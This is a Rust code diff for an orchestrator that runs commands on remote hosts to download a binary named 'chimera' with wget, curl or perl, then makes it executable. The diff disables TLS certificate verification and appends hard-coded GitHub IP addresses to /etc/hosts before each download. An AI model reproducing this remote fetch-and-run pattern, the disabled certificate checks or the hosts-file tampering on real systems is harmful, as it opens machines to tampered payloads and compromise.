@@ -425,11 +425,23 @@ impl Orchestrator {
 
     fn generate_download_command(tool: &str, url: &str) -> String {
         match tool {
-            "wget" => format!("wget -q {} -O {}", url, OUTPUT_PATH),
-            "curl" => format!("curl -s {} -o {}", url, OUTPUT_PATH),
+            "wget" => {
+                // Using BusyBox compatible options
+                format!(
+                    "wget -S --no-check-certificate {} -O {} 2>&1 && ls -l {}", 
+                    url, OUTPUT_PATH, OUTPUT_PATH
+                )
+            },
+            "curl" => {
+                format!(
+                    "curl -k -L -v {} -o {} 2>&1 && ls -l {}", 
+                    url, OUTPUT_PATH, OUTPUT_PATH
+                )
+            },
             "perl" => {
                 let (host, path) = Self::generate_perl_url_parts(url);
-                format!("perl -e 'use IO::Socket::SSL; $s=IO::Socket::SSL->new(PeerAddr=>\"{host}:443\") or die $!; print $s \"GET /{path} HTTP/1.0\\r\\nHost: {host}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"; while(<$s>){{last if /^\\r\\n$/}} while(read($s,$b,8192)){{print $b}}' > {output}", 
+                format!(
+                    "perl -e 'use IO::Socket::SSL qw(SSL_VERIFY_NONE); $s=IO::Socket::SSL->new(PeerAddr=>\"{host}:443\", SSL_verify_mode => SSL_VERIFY_NONE) or die $!; print $s \"GET /{path} HTTP/1.0\\r\\nHost: {host}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"; while(<$s>){{last if /^\\r\\n$/}} while(read($s,$b,8192)){{print $b}}' > {output} 2>&1 && ls -l {output}", 
                     host = host, 
                     path = path,
                     output = OUTPUT_PATH
@@ -448,6 +460,7 @@ impl Orchestrator {
         match Self::check_tool_exists(client, tool).await {
             Ok(output) => {
                 if !String::from_utf8_lossy(&output.stdout).trim().is_empty() {
+
                     let cmd = Self::generate_download_command(tool, CHIMERA_URL_UNIX);
                     let result = client.exec(&cmd!(cmd)).await;
                     Some(HostOperationResult {
@@ -469,6 +482,9 @@ impl Orchestrator {
 
         let win_results = self.download_chimera_win(communicator, &host_map).await;
         let unix_results = self.download_chimera_unix(communicator, &host_map).await;
+
+
+        communicator.exec_by_os(&cmd!("chmod +x /tmp/chimera"), OS::Unix).await;
 
         final_results.extend(win_results);
         final_results.extend(unix_results);
@@ -537,35 +553,66 @@ impl Orchestrator {
 
     async fn download_chimera_unix(&self, communicator: &Communicator, host_map: &HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)> {
         let unix_clients = communicator.get_clients_by_os(OS::Unix);
-
         let mut final_results = Vec::new();
 
         for (os, ip, client) in &unix_clients {
-            let tools = ["wget", "perl", "curl"];
+            let tools = ["wget", "curl", "perl"];
             let mut success = false;
 
             for tool in tools {
-                if let Some(result) = Self::try_download_with_tool(client, tool, ip, *os).await {
-                    final_results.push(result);
-                    success = true;
-                    break;
+                if let Ok(output) = Self::check_tool_exists(client, tool).await {
+                    if !String::from_utf8_lossy(&output.stdout).trim().is_empty() {
+                        let _ = client.exec(&cmd!("echo \"140.82.116.4 github.com\" >> /etc/hosts")).await;
+                        let _ = client.exec(&cmd!("echo \"185.199.108.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
+                        let _ = client.exec(&cmd!("echo \"185.199.109.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
+                        let _ = client.exec(&cmd!("echo \"185.199.110.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
+                        let _ = client.exec(&cmd!("echo \"185.199.111.133 objects.githubusercontent.com\" >> /etc/hosts")).await;
+
+                        /*
+                        let result = client.exec(&cmd!("cat /etc/hosts")).await.unwrap();
+                        info!("Hosts file: {}", String::from_utf8_lossy(&result.stdout));
+                        */
+
+                        let cmd = Self::generate_download_command(tool, CHIMERA_URL_UNIX);
+                        log::info!("[{}] Attempting download with {}: {}", ip, tool, cmd);
+                        
+                        match client.exec(&cmd!(cmd)).await {
+                            Ok(output) => {
+                                log::info!("[{}] {} succeeded\nstdout: {}\nstderr: {}", 
+                                    ip, tool,
+                                    String::from_utf8_lossy(&output.stdout),
+                                    String::from_utf8_lossy(&output.stderr)
+                                );
+                                
+                                success = true;
+                                final_results.push(HostOperationResult {
+                                    ip: ip.to_string(),
+                                    os: *os,
+                                    result: Ok(output)
+                                });
+                                break;
+                            }
+                            Err(e) => {
+                                log::error!("[{}] {} failed: {}", ip, tool, e);
+                                final_results.push(HostOperationResult {
+                                    ip: ip.to_string(),
+                                    os: *os,
+                                    result: Err(e)
+                                });
+                            }
+                        }
+                    }
                 }
             }
 
+
             if !success {
+                log::error!("[{}] No working download tools available", ip);
                 final_results.push(HostOperationResult {
                     ip: ip.to_string(),
                     os: *os,
                     result: Err(Error::CommandError("No download tools available".into())),
                 });
-            }
-        }
-        
-
-        // Make successful downloads executable
-        for (_, ip, client) in unix_clients {
-            if final_results.iter().any(|r| r.ip == ip.to_string() && r.result.is_ok()) {
-                let _ = client.exec(&cmd!(format!("chmod +x {}", OUTPUT_PATH))).await;
             }
         }
 
